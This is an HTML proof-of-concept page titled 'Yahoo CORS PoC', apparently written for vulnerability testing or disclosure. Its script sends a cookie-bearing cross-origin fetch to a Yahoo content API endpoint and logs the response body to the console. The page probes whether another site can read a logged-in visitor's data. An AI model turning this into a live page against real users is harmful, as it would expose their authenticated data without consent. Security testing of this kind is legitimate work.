<!DOCTYPE html>
<html>
<head>
    <title>Yahoo CORS PoC</title>
</head>
<body>
<h1>Yahoo CORS PoC</h1>
<p>Open the console (F12) to see the output.</p>

<script>
// Target URL
const target = "https://www.yahoo.com/caas/content/article/?uuid=a013139c-72da-3253-80a8-72aa5a4439be,7d6d7054-9b9b-3469-ab33-95ac7698d5e2,e8253ac8-e764-3eb5-aa19-a60a94dafb96&appid=news_web&device=desktop&lang=en-US&region=US&site=fp&partner=none&bucket=pushly-test-v2,seamless&features=enableEVPlayer,enableOverrideSpaceId,contentFeedbackEnabled,enableAdFeedbackV2,enableInArticleAd,enableOpinionLabel,enableSingleSlotting,enableVideoDocking,outStream,showCommentsIconWithDynamicCount,enableStickyAds,showCommentsIconInShareSec,enableGAMAdsOnLoad,enableFinancePremiumTicker,enableAdLiteUpSellFeedback,enableRRAtTop,enableCommentsCountInViewCommentsCta,enableRRAdsSlots,enableRRAdsSlotsWithJAC,newsModal,enableViewCommentsCTA,enableAdSlotsNewMap,enableGAMAds,enableAdSlotsFederationInBody,enableMidCenterAdOnViewer&rid=1hlkggtk9nf6g";

// Send request with credentials
fetch(target, {
    method: "GET",
    credentials: "include" // Send cookies
})
.then(response => {
    console.log("Status:", response.status);
    return response.text();
})
.then(data => {
    console.log("Response body:", data);
})
.catch(err => {
    console.error("Error:", err);
});
</script>
</body>
</html>
